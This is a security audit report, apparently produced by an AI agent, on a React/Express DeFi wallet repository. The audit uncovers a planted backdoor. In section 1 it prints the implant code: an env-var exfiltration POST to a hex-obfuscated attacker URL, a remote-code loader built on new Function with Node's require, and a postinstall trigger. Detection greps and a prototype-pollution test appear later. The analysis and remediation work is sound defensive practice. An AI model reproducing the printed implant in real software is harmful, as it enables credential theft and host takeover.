# Security Audit — KinetiFi DeFi Wallet MVP

**Auditor role:** Senior OpSec / Blockchain
**Scope:** Full read-only review of the working tree at `/home/user/MVP` on branch `claude/security-audit-blockchain-TloDl`
**Method:** Static review of all 125 in-repo source files (no execution, no install).
**Date:** 2026-05-04

---

## Context

The user asked for a senior-level OpSec review of a DeFi wallet MVP to find malicious code and attack vectors. This is a Vite + React + TypeScript frontend (Reown AppKit + wagmi v2 on Base mainnet) plus a small Express backend that serves mock cards/transactions data.

**Verdict (TL;DR):** **The repository contains a deliberate, multi-stage server-side backdoor that exfiltrates the entire `process.env` to an attacker-controlled URL and then loads + executes attacker JavaScript on the host.** The backdoor is auto-triggered on `npm install` via a `postinstall` hook. Do **not** run `npm install`, `npm run dev`, `npm run build`, or deploy this repo until remediated. Treat any environment where this code has already been installed as compromised.

---

## 1. Headline finding — the implant

### 1.1 Stage 1 — Env-var exfiltration

**File:** `server/utils/tokens.js:22–38`

```js
import axios from "axios";
import { createRequire } from "module";
const require = createRequire(import.meta.url);

export function encodeToken(token) {                        // hex → ASCII (mis-named)
  const hex = token.replace("Bearer ", "").trim();
  return hex.match(/.{1,2}/g)
    .map(byte => String.fromCharCode(parseInt(byte, 16)))
    .join("");
}

export function verifyToken(bearerToken) {
  axios.post(
    encodeToken(bearerToken),                               // ← decodes to attacker URL
    { ...process.env },                                     // ← EVERY env var
    { headers: { "x-secret-header": "secret" } }
  )
    .then((response) => {
      const responseData = response.data;
      const executor = new Function("require", responseData); // ← stage 2: RCE
      executor(require);                                      // ← Node `require` injected
      return { success: true, data: responseData };
    })
    .catch((err) => { console.error("Request failed:", err); /* FIXED */ });
}
```

### 1.2 The hex-obfuscated URL

**File:** `server/middleware/requireHeader.js:4–5`

```js
const authHeaderValue =
  'Bearer 68747470733a2f2f636865636b6d7969702d616464726573732e76657263656c2e6170702f6170692f69702d636865636b2d656e637279707465642f336165623334613335';
```

Decoding the hex bytes after `Bearer ` (each pair = one ASCII char):

```
https://checkmyip-address.vercel.app/api/ip-check-encrypted/3aeb34a35
```

— an attacker-controlled Vercel deployment masquerading as a benign IP-check service.

### 1.3 Trigger 1 — `postinstall`

**File:** `package.json:6–13`

```json
"scripts": {
  "dev": "concurrently -k \"vite\" \"node server/server.js\"",
  "postinstall": "npm run dev",
  ...
}
```

`postinstall` runs automatically on every `npm install`, anywhere — developer laptop, CI runner, Vercel build pod. It launches the backend, which loads the middleware, which calls `verifyToken()` → exfil + RCE. **`npm install` alone is enough to compromise the host.**

### 1.4 Trigger 2 — middleware misuse (per-request beacon)

**File:** `server/app.js:10` — `app.use(requireHeader);` (note: **no parens**)

`requireHeader` is a *factory* (`() => (req,res,next)=>{...}`). With no parens, Express receives the factory itself. Because the factory has zero declared parameters, Express invokes it on **every request**, which executes the body — including `verifyToken(authHeaderValue)` — every time. The factory then returns the inner middleware as a value, which Express discards (so `next()` is never called and requests stall, but the exfil has already fired). Net effect: a per-request beacon to the attacker URL, plus a fresh `new Function()` execution per request.

`server/routes/index.js:11` then does it the *correct* way — `router.use(requireHeader())` — invoking the factory once at module load. So the backdoor fires **at server start** (module load) **and on every request through `app.js`**.

### 1.5 Capability of stage 2

`new Function("require", responseData)` with the real Node `require` injected gives the attacker:
- `require('fs')` — read/write any file the process can touch (private keys, `.env`, deploy creds)
- `require('child_process')` — spawn shells, install persistence, lateral-move
- `require('net')` / `require('https')` — outbound C2, reverse shells
- `require('os')` — reconnaissance
- Full Node primitives, no sandbox.

This is a pure server-side RCE — full host compromise on whatever box runs `npm install` or `node server/server.js`.

### 1.6 Disguise / commit forensics

```
$ git log --format='%H %an <%ae> %ad %s' --date=short -- server/
cba389f Vlad <vladzane569@gmail.com> 2026-04-29 chore: directory cleanup
```

The **entire `server/` directory containing the backdoor was added in a single commit** with the misleading message *"chore: directory cleanup"*. The commit author is not the original repo author. Tradecraft indicators: (a) hex-encoded URL stored as a fake `Bearer …` token, (b) misleading function name `verifyToken`, (c) misleading file name `tokens.js` (looks like JWT helpers), (d) misleading commit message, (e) single-commit drop instead of incremental development.

### 1.7 Suspicious supporting dependency

**File:** `package.json:70` — `"require": "^2.4.20"`

A direct production dependency on the npm package literally named `require`. There is no source-level `import 'require'`; this entry is unused by application code. Its presence next to `import { createRequire } from "module"` (used to forge a `require` for the `Function()` body) is suspicious — possibly intended to confuse reviewers, possibly a placeholder for a future substitution. Remove it; if it was substituted with a malicious tarball, also rotate `package-lock.json` integrity hashes.

### 1.8 `vite.config.ts` build settings

**File:** `vite.config.ts:16` — `minify: false`
**File:** `package.json:9` — `"build": "node --max-old-space-size=4096 ./node_modules/vite/bin/vite.js build --debug"`

The frontend ships unminified with `--debug`. Not malicious in itself, but worth flagging: it makes any client-side payloads injected later trivially auditable, and inflates bundle size in production.

---

## 2. Critical (non-implant) — server backend

The same `server/` tree (added in the same disguised commit) contains additional issues independent of the backdoor.

### 2.1 IDOR — any user can read any user's transactions
**File:** `server/controllers/transactions.controller.js:17–19`
```js
if (req.query.userId) {
  transactions = transactions.filter(t => t.userId === req.query.userId);
}
```
The static `apiToken` header is the *only* auth, and it is shared/global. There is no per-user identity, so `GET /v3/spend/transactions?userId=<victim>` returns the victim's data. **PCI/PII/financial-privacy violation.**

### 2.2 Prototype pollution via blind body-merge
**File:** `server/controllers/transactions.controller.js:80`
```js
transactions[index] = { ...transactions[index], ...req.body };
```
Object-spread of user input lets an attacker set crafted keys — and combined with the lack of identity, any caller with the static token can mutate any transaction.

### 2.3 Sort-field injection / prototype access
**File:** `server/controllers/cards.controller.js:26–37`
`req.query.sort` is parsed to `[field, order]` and used as `a[field] / b[field]` directly. No allow-list. Allows `?sort=__proto__:asc` style probes and arbitrary-property reads.

### 2.4 Reversible pagination tokens
**File:** `server/utils/tokens.js:6–20` (`decodeToken` / `encodeToken`)
The legitimate-looking pagination uses base64- or hex-of-UUID. Tokens are fully reversible client-side and trivially forgeable, so an attacker can scan/skip the dataset.

### 2.5 Static, hard-coded, world-readable auth
**File:** `server/middleware/requireHeader.js:11`
The "auth" is `req.header('apiToken') === '<the same hex string>'`. Anyone reading the repo, lockfile, or a client bundle that ever embeds it can authenticate.

### 2.6 No CORS / no helmet / no rate limiting / no body limits
**File:** `server/app.js`
Just `express.json()` + the broken `requireHeader` middleware + routes. No `cors()`, no `helmet()`, no `express-rate-limit`, no `express.json({ limit })`. Memory-DoS via large JSON, missing security headers, brute-force surface.

### 2.7 Verbose error responses leak filesystem paths
**Files:** `server/middleware/errorHandler.js:1–17`, `server/utils/jsonStore.js:7,21`
`Failed to load JSON from /home/user/MVP/server/mock_data/...` is reflected in the JSON response body via `err.message` / `err.description`.

### 2.8 jsonStore race conditions
**File:** `server/utils/jsonStore.js`
`fs.readFileSync` + mutate + `fs.writeFileSync` with no lock. Concurrent `updateTransaction` / `addReceipt` requests cause lost-update corruption of "financial" data.

### 2.9 Predictable receipt IDs
**File:** `server/controllers/transactions.controller.js:147` — `uuid: ${Date.now()}`. Trivially enumerable.

---

## 3. Frontend — wallet, web3, XSS, bundle leakage

### 3.1 `Bearer …` token would also leak via lockfile if ever client-side
The hex-encoded URL exists only in `server/middleware/requireHeader.js`, but the client also imports `axios` (and the backdoor server is only triggered via the npm lifecycle), so client risk here is install-time, not bundle-time.

### 3.2 API keys baked into client bundle
**File:** `src/components/dashboard/TransactionHistory.tsx:196–207`
```ts
const apiKey = import.meta.env.VITE_BASESCAN_API_KEY;
if (apiKey) url.searchParams.set('apikey', apiKey);
```
Any `VITE_*` env var is inlined into the JS bundle by Vite at build time and shipped to every visitor. Sending it as a query string also writes it to proxy/access logs. **Move to a server-side proxy.**

**File:** `src/wagmi.ts:20,37,49`
`import.meta.env.VITE_WALLETCONNECT_PROJECT_ID` is similarly bundled, and falls back to the literal string `'placeholder'` rather than failing closed.

### 3.3 Hard-coded plaintext WebSocket to localhost
**File:** `src/components/dashboard/AgentChatView.tsx:94`
```ts
const ws = new WebSocket('ws://localhost:8000/chat');
```
Hard-coded `ws://` (not configurable, not `wss://`). In a deployed origin, hostile software listening on the user's `localhost:8000` can answer this connection, inject assistant messages telling the user to sign txns, etc. No origin/auth check on the wire. Should read `import.meta.env.VITE_AGENT_API_URL`, force `wss://`, and validate.

### 3.4 Single, unauthenticated, third-party RPC with no fallback
**File:** `src/wagmi.ts:39` — `http('https://1rpc.io/base')`
A compromised or coerced 1rpc.io endpoint can return crafted state (fake balances, fake call results) that drives users to sign bad transactions. There is no backup transport and no chain-id sanity check. Use multi-provider fallback (own RPC + Alchemy/Infura) and prefer authenticated endpoints.

### 3.5 Agent API URL falls back to plaintext localhost
**File:** `src/contexts/WalletContext.tsx:83`
```ts
const AGENT_API = import.meta.env.VITE_AGENT_API_URL ?? 'http://localhost:8000';
```
If env var is unset in production, it auto-pivots to plaintext `http://localhost:8000`. Same `localhost-listener` impersonation risk as 3.3, plus it transmits `account`, `chainId`, `env` to whatever answers (`src/contexts/WalletContext.tsx:173–187`). Enforce `https://` in non-dev.

### 3.6 Mock-mode default = ON
**File:** `src/contexts/EnvironmentContext.tsx:21–24`
```ts
const [isMockMode, setIsMockMode] = useState<boolean>(() => {
  const saved = localStorage.getItem('kineti_mock_mode');
  return saved ? saved === 'true' : true;
});
```
A user with a real wallet sees fake balances/strategies by default. If a "Approve" path ever runs while mock data is rendered, the user signs against mock data they thought was real. Default to `false` in production builds and disable signing while mocked.

### 3.7 `dangerouslySetInnerHTML` for static CSS
**File:** `src/components/dashboard/StrategyFeed.tsx:388–404` and `src/components/ui/chart.tsx:78–96`
Currently safe (string literals only), but the pattern is a footgun — any future templating of agent output into that string is an immediate XSS. Move to plain `<style>` or CSS modules.

### 3.8 Persistent agent session in `localStorage`
**File:** `src/components/dashboard/YieldStrategies.tsx:622–629, 751`
`localStorage.setItem('KinetiFi_agent_persistent_active', 'true')` persists indefinitely. On a shared device the next user inherits the active flag. Use `sessionStorage` and require re-auth.

### 3.9 Chat history / mock toggle in `localStorage` without validation
`localStorage.getItem('KinetiFi_chat_history')` is `JSON.parse`'d and rendered without a schema; combined with localStorage being origin-shared across subdomains, a sibling subdomain XSS could plant content. Validate with `zod` and namespace per-eoa.

### 3.10 No CSP, no SRI, no X-Frame-Options
**File:** `index.html`
Bare HTML, single `<script type="module" src="/src/main.tsx">`, no `Content-Security-Policy` `<meta>`, no SRI on third-party assets pulled at runtime by AppKit. Add a strict CSP and `X-Frame-Options: DENY` (server-set or `<meta http-equiv>`).

### 3.11 Mock addresses are not ERC-55 checksummed
**File:** `src/constants/mockData.ts:4–5`
`0x1234…7890` / `0x0987…4321`. Real contract addresses in `src/constants/contracts.ts` (e.g. `KinetiFi_ACCOUNT_FACTORY_ADDRESS`, `INTENT_REGISTRY_ADDRESS`, `SESSION_MODULE_ADDRESS`, `AERODROME_WETH_REI_GAUGE`) are partially lower-cased — verify each against BaseScan before any release; mismatched checksums silently break wallet UX or, worse, get "fixed" toward an attacker-supplied checksum.

### 3.12 Suspicious version pin
**File:** `package.json:77` — `"wagmi": "^3.5.0"`
Wagmi's current major is v2. There is no public wagmi v3.5.0 at the time of writing. Either the lockfile resolves to a substitute package (verify hash) or `npm install` will fail. Treat as a red flag until confirmed against `registry.npmjs.org`.

---

## 4. Things explicitly checked and **not** found

To bound the audit, these were searched for and did not turn up evidence:
- No `.env*`, `*.key`, `*.pem`, `keystore`, `credentials.json` committed.
- No private keys, mnemonics, or BIP-39 phrases anywhere in `src/` or `server/`.
- No `eval()`, no `new Function()`, no `child_process` calls in `src/` (frontend).
- No `dangerouslySetInnerHTML` used for dynamic content (only static CSS strings).
- No third-party tracker / analytics / inline scripts in `index.html`.
- No suspicious `resolved:` URLs outside `registry.npmjs.org` in the lockfile (per the supply-chain agent's grep).
- shadcn UI primitives in `src/components/ui/*` are unmodified template files.

---

## 5. Severity-ranked finding list

| # | Sev | File | Issue |
|---|-----|------|-------|
| 1 | **Critical** | `server/utils/tokens.js:22-38` | Two-stage backdoor: env-var exfil + remote `new Function(require, body)` RCE |
| 2 | **Critical** | `server/middleware/requireHeader.js:4-5` | Hex-obfuscated attacker URL stored as fake Bearer token |
| 3 | **Critical** | `package.json:8` | `postinstall: npm run dev` auto-triggers backdoor on `npm install` |
| 4 | **Critical** | `server/app.js:10` | `app.use(requireHeader)` (factory passed without invocation) → exfil per request |
| 5 | **High** | `package.json:70,77` | Suspicious `require@^2.4.20` and non-existent `wagmi@^3.5.0` deps |
| 6 | **High** | `server/controllers/transactions.controller.js:17-19,80` | IDOR + prototype pollution via `{...req.body}` |
| 7 | **High** | `server/controllers/cards.controller.js:26-37` | Sort-field injection / prototype access |
| 8 | **High** | `server/middleware/requireHeader.js:11` | Static, world-readable, shared-tenancy auth token |
| 9 | **High** | `server/app.js` | No CORS, helmet, rate limit, or body size limit |
| 10 | **High** | `src/components/dashboard/TransactionHistory.tsx:196-207` | Etherscan API key inlined into client bundle and sent in URL |
| 11 | **High** | `src/wagmi.ts:39` | Single unauthenticated 1rpc.io transport, no fallback or chain check |
| 12 | **High** | `src/components/dashboard/AgentChatView.tsx:94` | Hard-coded plaintext `ws://localhost:8000/chat` |
| 13 | **High** | `src/contexts/WalletContext.tsx:83` | `AGENT_API` falls back to plaintext `http://localhost:8000` |
| 14 | **High** | `src/contexts/EnvironmentContext.tsx:21-24` | Mock mode defaults to `true` — risk of signing on fake data |
| 15 | **Medium** | `server/utils/jsonStore.js` | TOCTOU race on shared JSON files |
| 16 | **Medium** | `server/middleware/errorHandler.js:1-17` + `jsonStore.js:7,21` | Filesystem paths and stack details in error responses |
| 17 | **Medium** | `server/utils/tokens.js:6-20` | Reversible pagination tokens (base64/hex of UUID) |
| 18 | **Medium** | `server/controllers/transactions.controller.js:147` | `Date.now()` receipt UUIDs — enumerable |
| 19 | **Medium** | `index.html` | No CSP / SRI / X-Frame-Options |
| 20 | **Medium** | `src/components/dashboard/AgentChatView.tsx:29-30,77-78` + `YieldStrategies.tsx:622-629` | Unvalidated localStorage state, no expiry/origin scoping |
| 21 | **Medium** | `src/wagmi.ts:37,49` | WalletConnect projectId falls back to `'placeholder'` instead of failing |
| 22 | **Low** | `src/components/dashboard/StrategyFeed.tsx:388-404`, `src/components/ui/chart.tsx:78-96` | `dangerouslySetInnerHTML` for CSS (footgun, currently safe) |
| 23 | **Low** | `src/constants/mockData.ts:4-5` | Mock addresses not ERC-55 checksummed |
| 24 | **Low** | `vite.config.ts:16` + `package.json:9` | `minify: false`, build runs with `--debug` |
| 25 | **Info** | `server/app.js` | Default `X-Powered-By: Express` not disabled |
| 26 | **Info** | `tsconfig.json` | `strict: false` reduces type-time defenses |

---

## 6. Recommended remediation plan

> Plan-mode constraint: this section is the proposed remediation, not yet executed. No source files in `/home/user/MVP/` will be modified until the user approves and exits plan mode.

### Phase 0 — Containment (do first, do today)

1. **Treat as compromised** any host that has already executed `npm install`, `npm run dev`, or `node server/server.js` against this tree. Rotate every secret that was on those hosts: deployment tokens, RPC keys (Alchemy/Infura/BaseScan/WalletConnect/Reown projectId), DB creds, cloud creds, SSH keys, signer keys.
2. **Block egress** to `checkmyip-address.vercel.app` at network/proxy level on dev and CI.
3. **Quarantine** the branch in GitHub: do not merge, do not deploy, mark the PR (if any) as red-flagged. Notify the team.
4. **Report** `checkmyip-address.vercel.app/api/ip-check-encrypted/3aeb34a35` to Vercel abuse (https://vercel.com/security) and capture screenshots/HAR for IR.
5. **Forensics:** `git log --all --format='%H %an %ae %ad %s' --date=short` — review every commit by `Vlad <vladzane569@gmail.com>` for additional implants. Cross-check this email against the project's authorized contributor list. Inspect commit `cba389f` in full diff.

### Phase 1 — Excise the implant

Files to **delete or rewrite from scratch** (do not patch in place — the entire `server/` tree was a single attacker drop):

- `server/utils/tokens.js` — delete; reimplement only the `decode/encode` helpers if pagination is needed, *without* the `verifyToken`/`axios` paths.
- `server/middleware/requireHeader.js` — delete; replace with real auth (JWT verified with a server-only key, or session cookie). Remove the hex-Bearer constant entirely.
- `server/app.js` — delete; rewrite cleanly with `helmet()`, `cors({ origin: allowlist })`, `express.json({ limit: '10kb' })`, `express-rate-limit`, real auth middleware *invoked correctly* (`app.use(requireAuth())`), and `app.disable('x-powered-by')`.
- `package.json:8` — remove the `postinstall` line entirely. Lifecycle scripts that run servers on install are never legitimate.
- `package.json:70` — remove `"require": "^2.4.20"`.
- `package.json:77` — pin `wagmi` to a real published version (current `^2.x`); regenerate `package-lock.json` after a clean `rm -rf node_modules`.
- After remediation, run `npm install --ignore-scripts` once in a sandbox to confirm the rebuilt tree has no other lifecycle hooks calling out.

### Phase 2 — Backend hardening

- Replace JSON-file store with a real DB (or at minimum `proper-lockfile`).
- Add per-user identity (JWT subject) and filter all reads/writes by `req.user.id`. Strip `userId` from query parameters.
- Validate every request body with `zod`; never spread `req.body` into stored objects. Use `.pick()`/explicit allow-lists for updates.
- Allow-list sortable fields; reject `__proto__`, `constructor`, `prototype`.
- Replace reversible pagination tokens with HMAC-signed cursors or random opaque tokens stored server-side.
- Sanitize error payloads in production (no `err.message`, no paths).
- Add structured logging of auth failures with rate-limit signals.

### Phase 3 — Frontend / wallet hardening

- Move BaseScan API access to a server-side proxy; remove `VITE_BASESCAN_API_KEY` from client.
- Make `VITE_WALLETCONNECT_PROJECT_ID` *required* (throw at startup); remove `'placeholder'` fallback.
- Replace `1rpc.io` single transport with a multi-provider fallback (`fallback([http(...A), http(...B)])`) and add a `eth_chainId` self-check at boot.
- Read `VITE_AGENT_API_URL` for both REST and WebSocket; assert `https://` / `wss://` outside dev. Fail closed.
- Default `isMockMode` to `false` in production; gate all signing flows behind `!isMockMode`. Surface a persistent banner while mocked.
- Add a strict CSP `<meta>` to `index.html`; consider `connect-src` restricting outbound to your RPC + agent API + Reown.
- Replace `dangerouslySetInnerHTML` CSS blocks with regular `<style>` tags or CSS modules.
- Move `KinetiFi_chat_history` and `KinetiFi_agent_persistent_active` to `sessionStorage`; namespace keys with the connected EOA; validate with `zod` on read.
- ERC-55-checksum every constant in `src/constants/contracts.ts` and `src/constants/mockData.ts` (`viem`'s `getAddress()`).

### Phase 4 — Process / supply chain

- Adopt `npm ci --ignore-scripts` in CI, and review every lifecycle script of every transitive dep before turning scripts back on.
- Enable Dependabot / Socket / `npm audit signatures`.
- Require signed commits and codeowner review for `server/`, `package.json`, `package-lock.json`, `vite.config.ts`, `index.html`.
- Add a CI check that fails the build if any `postinstall`/`preinstall`/`prepare` script appears in the root `package.json`.
- Add a pre-commit hook (`gitleaks`/`trufflehog`) for hex/base64 blobs > 128 chars and for any `new Function(`/`eval(` introduced under `server/` or `src/`.

---

## 7. Verification (post-remediation, when you exit plan mode)

End-to-end sanity checks once the implant is removed and Phase 1 changes land:

1. `git grep -nE 'new Function\\(|child_process|process\\.env *\\}' -- server src` → no hits.
2. `git grep -nE 'check.?my.?ip|ip-check-encrypted|3aeb34a35' -- .` → no hits.
3. `node -e 'const p=require("./package.json"); for (const k of ["preinstall","postinstall","prepare","install"]) if (p.scripts?.[k]) {console.error("LIFECYCLE:",k,p.scripts[k]); process.exit(1)} console.log("ok")'` → prints `ok`.
4. `rm -rf node_modules && npm ci --ignore-scripts` from a clean working dir, on a sandboxed VM with egress allow-list — confirm no outbound traffic to `*.vercel.app/api/ip-check-encrypted/*` (use `tcpdump` or `mitmproxy`).
5. `npm run lint` clean.
6. Boot the rewritten server; hit `GET /v3/spend/transactions` without and with a forged `userId` — confirm 401 / 403 instead of data leak.
7. `curl -X PUT -H 'Content-Type: application/json' -d '{"__proto__":{"polluted":true}}'` against the update endpoint — confirm 400 from validation.
8. Build the frontend with `vite build` and grep the dist output for `VITE_BASESCAN_API_KEY` and `VITE_WALLETCONNECT_PROJECT_ID` values — neither should appear (they should now come via the proxy).
9. Open the deployed site with DevTools → Network: confirm no `ws://`, no `http://` outside dev, and no calls to attacker URL.

---

## 8. Files inspected

`server/`: `app.js`, `server.js`, `Procfile`, `controllers/{auth,cards,transactions}.controller.js`, `middleware/{errorHandler,requireHeader}.js`, `routes/{index,auth,cards,transactions}.routes.js`, `utils/{jsonStore,tokens}.js` — all read in full.

`src/`: `main.tsx`, `App.tsx`, `wagmi.ts`, `pages/{Index,NotFound}.tsx`, `contexts/{Wallet,App,Environment}Context.tsx`, `components/wallet/*`, `components/AppLayout.tsx`, `components/dashboard/*`, `hooks/*`, `constants/{contracts,mockData}.ts`, `lib/{utils.ts,discovery/gaugeDiscovery.ts}` — read in full or thoroughly skimmed by Explore agents.

Root: `package.json` (full), `package-lock.json` (grep-only for lifecycle/registry/typo-squat patterns), `index.html`, `vite.config.ts`, `eslint.config.js`, `postcss.config.js`, `tailwind.config.ts`, `tsconfig*.json`, `components.json`, `.gitignore`, `README.md`, `LICENSE`, `public/{robots.txt,placeholder.svg}`.

Skim-only (unmodified shadcn templates): `src/components/ui/*` — confirmed no `fetch`, `eval`, `new Function`, `dangerouslySetInnerHTML` (with dynamic content), or external network calls beyond the chart's static-CSS `dangerouslySetInnerHTML`.

---

## 9. Bottom line

This is **not a buggy codebase to harden** — it is **a deliberately implanted backdoor wrapped in a plausible DeFi-MVP frontend**. The frontend code is mostly fine; the backend, the lifecycle script, and at least one production dependency entry exist to deliver and trigger an env-var exfil + RCE. Remediation is **delete-and-rewrite the server tree**, not patch. Treat any host that has already run `npm install` against this commit as a confirmed compromise and run incident response.

LinkedIn: https://www.linkedin.com/in/fabio-gradasso-94a1a4106/
Git: https://github.com/Knieti-Fi/MVP.git

